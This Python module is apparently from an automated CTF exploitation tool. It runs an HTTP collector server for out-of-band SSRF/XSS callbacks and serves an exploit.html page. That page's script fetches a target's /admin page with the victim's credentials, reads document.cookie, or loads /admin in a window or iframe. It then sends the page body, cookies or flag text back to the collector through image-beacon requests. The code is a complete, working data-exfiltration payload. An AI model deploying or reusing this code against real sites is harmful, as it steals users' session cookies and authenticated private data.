"""HTTP collector server extracted from ctf_dispatcher.py.

Small asyncio HTTP server used to catch SSRF/XSS out-of-band callbacks during
exploitation. Pulled out of ctf_dispatcher.py (it has no dependency on the
CTFTaskDispatcher class). Imported back there as `_CollectorServer`.
"""
from __future__ import annotations

import asyncio
import json
from urllib.parse import parse_qs, quote_plus, urlparse

from .dispatcher_helpers import _collector_public_host_for_target

__all__ = ["_CollectorServer"]


class _CollectorServer:
    def __init__(self, target_base: str, host: str = "0.0.0.0", port: int = 7777):
        self.target_base = target_base.rstrip("/")
        self.host = host
        self.port = port
        self.public_host = _collector_public_host_for_target(target_base)
        self._server: asyncio.base_events.Server | None = None
        self._event = asyncio.Event()
        self.hits: list[str] = []

    @property
    def base_url(self) -> str:
        return f"http://{self.public_host}:{self.port}"

    def exploit_url(self, mode: str) -> str:
        target = quote_plus(self.target_base)
        return f"{self.base_url}/exploit.html?mode={quote_plus(mode)}&target={target}"

    async def start(self) -> None:
        self._server = await asyncio.start_server(self._handle, self.host, self.port)

    async def stop(self) -> None:
        if self._server is not None:
            self._server.close()
            await self._server.wait_closed()
            self._server = None

    async def wait_for_hit(self, timeout: float = 6.0) -> str | None:
        if self.hits:
            return self.hits[-1]
        try:
            await asyncio.wait_for(self._event.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            return None
        return self.hits[-1] if self.hits else None

    async def _handle(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        try:
            data = await reader.readuntil(b"\r\n\r\n")
            request_line = data.splitlines()[0].decode("latin-1", errors="ignore")
            parts = request_line.split()
            path = parts[1] if len(parts) >= 2 else "/"

            if path.startswith("/exploit.html"):
                body = self._exploit_html(path).encode("utf-8")
                response = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: text/html; charset=utf-8\r\n"
                    + f"Content-Length: {len(body)}\r\n\r\n".encode("ascii")
                    + body
                )
            elif path.startswith("/c") or (path.startswith("/?") and path != "/"):
                self.hits.append(path)
                self._event.set()
                body = b"ok"
                response = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: text/plain; charset=utf-8\r\n"
                    + f"Content-Length: {len(body)}\r\n\r\n".encode("ascii")
                    + body
                )
            else:
                body = b"collector"
                response = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: text/plain; charset=utf-8\r\n"
                    + f"Content-Length: {len(body)}\r\n\r\n".encode("ascii")
                    + body
                )
            writer.write(response)
            await writer.drain()
        except Exception:
            pass
        finally:
            writer.close()
            await writer.wait_closed()

    def _exploit_html(self, path: str) -> str:
        parsed = urlparse(path)
        params = parse_qs(parsed.query)
        mode = (params.get("mode") or ["A"])[0]
        target = (params.get("target") or [self.target_base])[0]
        return f"""<!doctype html>
<html><body>
<script>
const TARGET = {json.dumps(target)};
const hit = (k, v) => new Image().src = '/c?' + k + '=' + encodeURIComponent(v);
(async () => {{
  try {{
    if ({json.dumps(mode)} === 'A') {{
      const r = await fetch(TARGET + '/admin', {{credentials:'include'}});
      const t = await r.text();
      hit('body', t);
    }} else if ({json.dumps(mode)} === 'B') {{
      hit('cookie', document.cookie || '');
    }} else if ({json.dumps(mode)} === 'C') {{
      var w = window.open(TARGET + '/admin');
      setTimeout(() => {{
        try {{ hit('flag', w.document.body.innerText || ''); }}
        catch (e) {{ hit('openErr', String(e)); }}
      }}, 3000);
    }} else {{
      var f = document.createElement('iframe');
      f.src = TARGET + '/admin';
      document.body.appendChild(f);
      f.onload = () => {{
        try {{ hit('iframe', f.contentDocument.body.innerText || ''); }}
        catch (e) {{ hit('iframeErr', String(e)); }}
      }};
    }}
  }} catch (e) {{
    hit('err', String(e));
  }}
}})();
</script>
collector ready
</body></html>"""
